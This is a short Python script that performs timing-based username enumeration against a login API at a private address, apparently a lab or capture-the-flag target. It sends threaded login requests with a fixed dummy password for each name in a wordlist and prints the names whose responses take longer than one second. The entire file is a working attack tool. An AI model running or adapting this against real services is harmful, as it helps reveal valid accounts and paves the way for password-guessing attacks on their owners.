import requests
from concurrent.futures import ThreadPoolExecutor

def naredba(name):
    url = "http://10.10.141.79:8080/api/user/login"
    data = {"username": name, "password": "meme"}
    
    try:
        response = requests.post(url, json=data, timeout=5)
        response_time = response.elapsed.total_seconds()
        
        if response_time > 1:
            print(name)
    except requests.RequestException:
        pass 

with open("names.txt", "r") as file:
    names = [line.strip() for line in file if line.strip()]

# Adjust the number of threads (10–50 usually works well)
with ThreadPoolExecutor(max_workers=20) as executor:
    executor.map(naredba, names)
